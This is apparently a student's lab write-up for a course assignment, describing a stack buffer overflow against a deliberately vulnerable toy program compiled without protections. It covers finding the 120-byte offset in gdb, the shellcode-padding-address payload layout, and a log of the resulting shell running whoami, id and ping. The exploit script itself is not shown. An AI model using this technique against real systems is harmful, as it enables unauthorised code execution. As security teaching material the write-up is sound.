---- How to run -------------------
Simply compile and run via running:
   make exploit

Hit just enter when it asks for 
input aaaand the shell spawns.
Try whoami, ls, id, etc...
-----------------------------------

---- Important Note ---------------
The script needs Python v2 to run
properly, otherwise the 'struct' lib
wont work as intended.
-----------------------------------
  
---- Way of Thinking -------------------------------------------------------------------------------------

1) First, i tried pocking the program by just entering a random
   number of 'A's as input, to see when it crashes (SIGSEGV). Found
   it crashes completely for 111 chars of input.

2) What we want to take advantage of is the following:

   Consider this to be the input string:
   -------------------|----------------------------------|-------------------------
        shellcode               wow such empty           |   big_boy_buffer addr
   -------------------|----------------------------------|-------------------------
            ^                          ^                              ^
    Byte assembly code           Empty space, will             The mem_addr of 
    that spawns shell               explain why                big_boy_buffer

   We are trying to create an input string that will overflow the input buffer and its 
   last chars will flow into the RIP register (Instruction pointer register) and redirect
   the execution flow to the address of big_boy_buffer which will include the shellcode 
   that will be read normally. 
   ! The only thing we need to find out is how big this empty should be in order for the input
     to be long enough to overflow the buffer and flow into the RIP register !
 
3) Using gdb (gef version) I found out the address of big_boy_buffer to be 0x404080
   Then I debugged the script using gdb and as input a random string with the following pattern:
   
                          AAAAAA.....AAABBBBBB
   I tested the input again and again to find out when 'B's would flow into the RIP register. By
   the moment all 6 'B's the numbers of 'A's was enough to take control of the RIP register.
   At the same time time I found out the address of the local variable of function vuln() 'buffer'  
   to be 0x7fffffffe1b0
   The address that the address the RIP register had when vuln() was hitting return was
   0x7fffffffe228
   
    0x7fffffffe1b0 buffer (local variable at vuln())
    0x7fffffffe228 $rip
   -____________________
              -120 bytes difference   (decimal) 

   So in order to overflow the input buffer and be able to put data into the RIP register we need
   to enter 120 bytes. Beyond that point and for the next 8 bytes all data will be directed to RIP.
   So the final payload struct will be:
  
   1................27.28..............................99.120...................128
   -------------------|----------------------------------|-------------------------
        shellcode               wow such empty           |   big_boy_buffer addr
   -------------------|----------------------------------|-------------------------
           
   We construct the payload using the python script (Descriptive comments inside) and feed it 
   to the ./bof executable.

   With the payload given as input, when the execution flow returns from the vuln() function the 
   Instruction pointer will be 0x404080. When the processor tries to fetch the instruction
   from that mem_addr, it will be the first instruction for the spawning of the shell.
------------------------------------------------------------------------------------------------------------

Here is an example execution for proof of work:



dpetrou@mate:~/assign7_net$ make exploit
make
make[1]: Entering directory '/home/dpetrou/assign7_net'
gcc -ggdb -fno-stack-protector -z execstack -Wall -no-pie -o bof pwn.c
pwn.c: In function ‘vuln’:
pwn.c:45:5: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   45 |     gets(buffer);
      |     ^~~~
      |     fgets
/usr/bin/ld: /tmp/cczSJtBu.o: in function `vuln':
/home/dpetrou/assign7_net/pwn.c:45: warning: the `gets' function is dangerous and should not be used.
make[1]: Leaving directory '/home/dpetrou/assign7_net'
python2 exploit.py > payload.bin
(cat payload.bin ;cat)| ./bof
GREETINGS FELLOW TRAVELER!

My job is to repeat everything you say to me, just to annoy you!!
:)

You only get one chance... make it count!!
What do you want to say to me:

You said: 1�H�ѝ��Ќ��H��ST_�RWT^�;����������������������������������������������������������������������������������������������@@

ls
Makefile  README.txt  bof  exploit.py  payload.bin  pwn.c
whoami
dpetrou
id
uid=1000(dpetrou) gid=1000(dpetrou) groups=1000(dpetrou),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare)
ping google.com -c 1
PING google.com (142.250.185.110) 56(84) bytes of data.
64 bytes from fra16s49-in-f14.1e100.net (142.250.185.110): icmp_seq=1 ttl=115 time=80.8 ms

--- google.com ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 80.817/80.817/80.817/0.000 ms
ls
Makefile  README.txt  bof  exploit.py  payload.bin  pwn.c
echo I have been exploited
I have been exploited